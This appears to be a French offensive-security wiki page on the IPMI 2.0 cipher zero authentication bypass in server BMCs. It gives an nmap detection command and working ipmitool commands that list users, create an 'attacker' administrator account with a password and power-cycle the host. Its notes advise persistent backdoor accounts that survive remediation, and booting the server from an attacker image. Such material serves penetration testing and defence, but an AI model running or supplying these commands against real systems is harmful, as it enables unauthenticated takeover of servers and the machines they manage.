---
title: "Contournement IPMI cipher 0 : exécution de commandes BMC sans authentification"
order: 1
description: "IPMI 2.0 définit la suite de chiffrement zéro, qui désactive l'authentification et l'intégrité de la session. Les BMC qui autorisent le cipher 0 acceptent des commandes IPMI administratives de quiconque sans identifiant valide, permettant à un attaquant de créer des utilisateurs, de lire la configuration et de contrôler l'alimentation et le démarrage de l'hôte, une compromission totale et pré-authentification du contrôleur de gestion."
keywords:
  - ipmi cipher 0
  - cipher zéro
  - bmc
  - contournement d'authentification
  - ipmitool
---

# Contournement IPMI cipher 0

IPMI 2.0 négocie une suite de chiffrement pour chaque session, et la suite de chiffrement zéro est une valeur spéciale signifiant aucune authentification et aucune intégrité, destinée uniquement à des cas précis locaux ou de configuration initiale. De nombreux BMC acceptent néanmoins le cipher 0 sur le réseau, et lorsqu'ils le font, le contrôleur exécute des commandes IPMI administratives de tout client sans identifiant valide : le mot de passe envoyé est ignoré. Un attaquant parle simplement IPMI avec le cipher 0 et effectue des opérations privilégiées, créant un compte administrateur, lisant et modifiant la configuration, et contrôlant l'alimentation et le périphérique de démarrage de l'hôte, une prise de contrôle complète et non authentifiée du BMC et donc du serveur.

```bash
# detect cipher 0 acceptance
nmap -sU -p623 --script ipmi-cipher-zero <target>
# exploit with ipmitool using cipher 0 (-C 0); the password is ignored
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' user list          # enumerate users
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' user set name 5 attacker
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' user set password 5 Passw0rd!
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' user priv 5 4        # admin
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' chassis power cycle  # control the host
```

## Notes d'exploitation

- `-C 0` sélectionne le cipher zéro dans ipmitool ; comme l'authentification est désactivée, les valeurs `-U`/`-P` sont sans importance, les commandes s'exécutent quoi qu'il arrive, ce qui est tout le bug.
- Créez un compte BMC administrateur persistant (comme ci-dessus) pour que l'accès survive même si le cipher 0 est désactivé plus tard ; utilisez ensuite l'interface authentifiée normale.
- Le contrôle administratif du BMC signifie l'alimentation de l'hôte, la sélection du périphérique de démarrage, la console et le média virtuel, de quoi démarrer le serveur sur une image de l'attaquant et compromettre le système d'exploitation, voir [iDRAC et iLO](idrac-and-ilo.md) pour l'étape du média virtuel.
- C'est non authentifié et sur UDP 623 ; un BMC atteignable acceptant le cipher 0 est une compromission immédiate et complète du plan de gestion du serveur.

## Outils

- [ipmitool](https://github.com/ipmitool/ipmitool)
- [nmap ipmi-cipher-zero](https://nmap.org/nsedoc/scripts/ipmi-cipher-zero.html)

## Références

- [IPMI 2.0 cipher suites](https://www.intel.com/content/www/us/en/products/docs/servers/ipmi/ipmi-second-gen-interface-spec-v2-rev1-1.html)
- [Dan Farmer: IPMI/BMC security](http://fish2.com/ipmi/)
